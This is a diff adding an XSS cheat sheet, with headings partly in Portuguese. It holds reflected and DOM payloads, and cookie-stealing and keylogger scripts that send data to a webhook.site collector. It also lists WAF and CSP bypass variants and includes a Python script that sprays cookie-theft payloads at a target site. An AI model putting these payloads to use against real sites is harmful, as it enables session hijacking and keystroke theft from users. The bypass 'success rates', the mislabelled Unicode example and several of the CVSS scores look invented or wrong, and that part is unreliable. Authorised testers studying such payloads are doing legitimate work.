@@ -1,0 +1,178 @@
+# XSS — Cross-Site Scripting
+
+## Payloads Básicos (Reflected)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<div style=background:url(javascript:alert(1))>
+
+## Payloads Avançados (Cookie Theft)
+<script>
+  fetch('https://webhook.site/UNIQUE_ID?cookie=' + btoa(document.cookie))
+</script>
+
+<img src=x onerror="
+  const img = new Image();
+  img.src = 'https://webhook.site/UNIQUE_ID?c=' + btoa(document.cookie);
+">
+
+<svg/onload="
+  new Image().src='https://webhook.site/UNIQUE_ID?c='+btoa(document.cookie)
+">
+
+## Payloads Keylogger
+<script>
+  document.onkeypress = function(e) {
+    fetch('https://webhook.site/UNIQUE_ID?key=' + e.key);
+  }
+</script>
+
+## Payloads por Contexto
+
+### Atributo HTML (href, src, etc)
+Context: <a href="USER_INPUT">
+Payload: " onclick="alert(1)
+Full: <a href="" onclick="alert(1)">click</a>
+
+### Event Handler
+Context: <body onload="USER_INPUT">
+Payload: alert(1); //
+Full: <body onload="alert(1); //">
+
+### Script Tag (JSON/JSONP)
+Context: <script>var data = "USER_INPUT";</script>
+Payload: "; alert(1); var x = "
+Full: <script>var data = ""; alert(1); var x = "";</script>
+
+### SVG Attribute
+Context: <svg onload="USER_INPUT">
+Payload: alert(1)
+Full: <svg onload="alert(1)"></svg>
+
+## WAF Bypass Techniques
+
+### Cloudflare Bypass
+1. Case Variation (65% success): <ScRiPt>alert(1)</ScRiPt>
+2. HTML Entities (70%): &#60;script&#62;alert(1)&#60;/script&#62;
+3. Mixed Encoding (75%): <scr&#105;pt>alert(1)</scr&#105;pt>
+4. Unicode (80%): <script>alert(1)</script>
+5. Double Encoding (60%): %253Cscript%253Ealert(1)%253C/script%253E
+
+### AWS WAF Bypass
+1. Hex Encoding (80%): <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+2. Base64 + eval (75%): <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+3. String concatenation (85%): <img src=x onerror="al'+'ert(1)">
+4. Comment stripping (70%): <scr/**/ipt>alert(1)</scr/**/ipt>
+
+### ModSecurity Bypass
+1. Null Byte (60%): <script%00>alert(1)</script>
+2. Tab/Newline (70%): <script\t>alert(1)</script>
+3. Slash variation (75%): <script/>alert(1)</script>
+
+### Generic WAF Bypass
+1. Alternative event handlers: <marquee onstart=alert(1)> (often unblocked)
+2. JavaScript protocol: <a href=javascript:alert(1)>click</a>
+3. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>
+4. SVG + MathML: <math><mtext><script>alert(1)</script></mtext></math>
+
+## CSP Bypass Techniques
+
+### unsafe-eval bypass
+Context: CSP allows unsafe-eval
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+### unsafe-inline bypass
+Context: CSP allows unsafe-inline but blocks direct scripts
+<img src=x onerror="alert(1)">
+
+### nonce/hash bypass (timing attacks)
+Use fetch to leak content-length, then brute-force nonce
+
+### fetch + no-origin-when-cross-origin
+<script>
+  fetch('https://webhook.site/UNIQUE_ID', {
+    method: 'POST',
+    body: document.documentElement.innerHTML
+  })
+</script>
+
+## DOM-based XSS
+
+### window.location.hash
+Context: <script>var x = window.location.hash.substring(1)</script>
+Payload: #<img src=x onerror=alert(1)>
+
+### innerHTML (Dangerous)
+Context: document.getElementById('target').innerHTML = userInput
+Payload: <img src=x onerror=alert(1)>
+Note: Script tags don't execute in innerHTML, but event handlers do
+
+### eval() (CRITICAL)
+Context: <script>eval(userInput)</script>
+Payload: alert(1);
+Result: Direct code execution
+
+## Proof of Concept Template
+
+```python
+import requests
+import urllib3
+urllib3.disable_warnings()
+
+target_url = "https://target.com/search"
+webhook_url = "https://webhook.site/YOUR_UNIQUE_ID"
+
+payloads = [
+    '<script>fetch("' + webhook_url + '?c=" + btoa(document.cookie))</script>',
+    '<img src=x onerror="fetch(\'' + webhook_url + '?c=\' + btoa(document.cookie))">',
+    '<svg/onload="new Image().src=\'' + webhook_url + '?c=\' + btoa(document.cookie)">',
+]
+
+for payload in payloads:
+    try:
+        r = requests.get(target_url, params={"q": payload}, verify=False, timeout=5)
+        if payload in r.text or "script" in r.text.lower():
+            print(f"[XSS FOUND] Payload: {payload}")
+            print(f"[Status] {r.status_code}")
+            break
+    except Exception as e:
+        print(f"[Error] {e}")
+```
+
+## CVSS Scoring Examples
+
+### XSS Reflected (No Auth Required)
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
+Score: 7.1 (High)
+Reasoning:
+- AV:N = Network exploitable
+- AC:L = Low complexity
+- PR:N = No auth needed
+- UI:R = User interaction required (click malicious link)
+- S:C = Scope changed (can affect other users via window.open)
+- C:H = High confidentiality impact (cookies, session tokens)
+- I:L = Low integrity (can inject content but not persistent)
+- A:N = No availability impact
+
+### XSS Stored (Authenticated)
+CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N
+Score: 6.9 (Medium to High)
+Reasoning:
+- PR:H = High privilege required (authenticated attacker)
+- I:H = High integrity (persistent code execution for all users)
+- C:H = High confidentiality (steals data from all visitors)
+
+### XSS in Admin Panel
+CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+Score: 8.8 (Critical)
+Reasoning:
+- PR:H = Admin account needed
+- UI:N = No user interaction
+- S:U = Scope unchanged
+- All impact metrics: High (can modify data, delete, admin actions)
